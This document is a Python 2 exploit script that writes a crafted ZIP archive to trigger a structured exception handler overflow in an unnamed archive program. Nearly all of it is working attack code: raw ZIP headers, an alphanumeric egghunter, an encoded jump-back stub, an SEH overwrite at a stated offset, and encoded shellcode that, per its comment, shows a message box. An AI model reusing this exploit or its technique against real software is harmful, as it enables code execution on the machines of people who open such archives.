#!/usr/bin/python

''' This exploit requires an alphanumeric encoded decoder (buildjmp) that will write 
     jump instructions to jump to an alphanumeric encoded egghunter that will search
     for and find the shellcode in the heap. The shellcode gets sent to the heap due to 
     a null byte in the POP POP RET address of the seh.
     
     Note: This exploit will not return a reverse shell outside of a debugger, but will create
     a popup message box without a debugger.'''

import os,struct

filename = "exploit.zip"

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00"
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f"# file size
"\x00\x00\x00")

cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14"
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f" # file size
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00"# Size of central directory (bytes)
"\x02\x10\x00\x00"# Offset of start of central directory,
"\x00\x00")           # relative to start of archive

# messagebox
shellcode = ("\x89\xe7\xd9\xcc\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
"\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b"
"\x69\x78\x6b\x4f\x6b\x4e\x39\x62\x54\x61\x34\x6b\x44\x46\x51"
"\x4e\x32\x6f\x42\x42\x57\x35\x61\x78\x49\x35\x34\x6c\x4b\x54"
"\x31\x46\x50\x4e\x6b\x70\x76\x54\x4c\x4e\x6b\x71\x66\x65\x4c"
"\x4e\x6b\x42\x66\x43\x38\x6e\x6b\x61\x6e\x65\x70\x4c\x4b\x54"
"\x76\x36\x58\x62\x6f\x52\x38\x62\x55\x48\x73\x53\x69\x56\x61"
"\x5a\x71\x4b\x4f\x69\x71\x55\x30\x6e\x6b\x30\x6c\x56\x44\x47"
"\x54\x6e\x6b\x52\x65\x67\x4c\x6e\x6b\x70\x54\x65\x78\x44\x38"
"\x45\x51\x49\x7a\x4e\x6b\x30\x4a\x57\x68\x6e\x6b\x62\x7a\x71"
"\x30\x55\x51\x5a\x4b\x69\x73\x76\x54\x72\x69\x6e\x6b\x54\x74"
"\x4e\x6b\x67\x71\x48\x6e\x75\x61\x4b\x4f\x46\x51\x69\x50\x79"
"\x6c\x4e\x4c\x4f\x74\x69\x50\x50\x74\x47\x77\x6a\x61\x48\x4f"
"\x34\x4d\x33\x31\x7a\x67\x48\x6b\x58\x74\x35\x6b\x51\x6c\x31"
"\x34\x74\x68\x34\x35\x4d\x31\x6c\x4b\x31\x4a\x55\x74\x37\x71"
"\x6a\x4b\x30\x66\x6c\x4b\x56\x6c\x62\x6b\x4c\x4b\x30\x5a\x67"
"\x6c\x43\x31\x78\x6b\x4e\x6b\x74\x44\x4c\x4b\x57\x71\x59\x78"
"\x4e\x69\x42\x64\x54\x64\x67\x6c\x65\x31\x48\x43\x48\x32\x75"
"\x58\x65\x79\x7a\x74\x4d\x59\x49\x75\x4b\x39\x68\x42\x53\x58"
"\x4e\x6e\x72\x6e\x74\x4e\x38\x6c\x31\x42\x6d\x38\x6d\x4f\x49"
"\x6f\x59\x6f\x6b\x4f\x6e\x69\x42\x65\x45\x54\x4d\x6b\x48\x6f"
"\x6a\x6e\x69\x70\x55\x30\x4f\x77\x65\x4c\x55\x74\x70\x52\x6a"
"\x48\x4e\x6e\x6b\x4f\x59\x6f\x79\x6f\x4d\x59\x57\x35\x43\x38"
"\x51\x78\x70\x6c\x30\x6c\x55\x70\x33\x71\x42\x48\x37\x43\x64"
"\x72\x56\x4e\x30\x64\x42\x48\x64\x35\x43\x43\x50\x65\x54\x32"
"\x30\x30\x69\x4b\x4d\x58\x61\x4c\x47\x54\x55\x5a\x4f\x79\x78"
"\x66\x32\x76\x4b\x4f\x62\x75\x55\x54\x6c\x49\x4f\x32\x66\x30"
"\x4f\x4b\x39\x38\x79\x32\x30\x4d\x4f\x4c\x4c\x47\x45\x4c\x65"
"\x74\x31\x42\x6a\x48\x53\x6f\x6b\x4f\x6b\x4f\x6b\x4f\x35\x38"
"\x33\x54\x63\x68\x47\x50\x57\x50\x73\x58\x44\x30\x42\x57\x52"
"\x4e\x32\x45\x30\x31\x69\x4b\x6f\x78\x71\x4c\x56\x44\x76\x65"
"\x6e\x69\x78\x63\x55\x38\x50\x64\x66\x38\x61\x30\x31\x30\x45"
"\x38\x70\x70\x33\x47\x32\x4e\x32\x45\x44\x71\x58\x49\x4d\x58"
"\x70\x4c\x44\x64\x74\x45\x4d\x59\x69\x71\x66\x51\x79\x42\x63"
"\x62\x32\x73\x70\x51\x46\x32\x39\x6f\x58\x50\x50\x31\x4f\x30"
"\x30\x50\x4b\x4f\x30\x55\x45\x58\x41\x41")

# Payload size: 125
egghunter = 'SYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI2FK1IZKO4OQR0RCZ320XXM6N7L5UQJ44JOX8V7VPVPF4K99GNORUKZNOBUKWKOKWAA'

movESP = ("\x54\x58"
"\x66\x05\x3f\x06"
"\x50\x5c"
"\x54\x5b") 

# [*] Shellcode final size: 52 bytes
jumpback = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jumpback += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jumpback += "\x05\x11\x77\x62\x41" ## add  eax, 0x41627711
jumpback += "\x05\x12\x66\x52\x41" ## add  eax, 0x41526612
jumpback += "\x05\x11\x55\x62\x41" ## add  eax, 0x41625511
jumpback += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
jumpback += "\x50"                 ## push eax
jumpback += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jumpback += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jumpback += "\x05\x33\x41\x76\x13" ## add  eax, 0x13764133
jumpback += "\x05\x33\x40\x75\x12" ## add  eax, 0x12754033
jumpback += "\x50"

nseh = '\x89\x9f\x41\x41'
seh = struct.pack("<I",0x006E3F2A) # 006E3F2A

payload = egghunter
payload += 'A' * (298 - len(nseh + movESP + egghunter + jumpback) - 61) # [*] Exact match at offset 298
payload += movESP
payload += jumpback
payload += 'A' * 61
payload += nseh
payload += seh
payload += 'W00TW00T'
payload += shellcode
payload += 'D' * (4064 - len(payload))
payload += ".txt"

print "Size: " + str(len(payload)) + "\n"
print "Removing old " + filename + " file\n"
os.system("rm " + filename)
print "Creating new file: " + filename + "\n"
file = open(filename, "w")
file.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
file.close()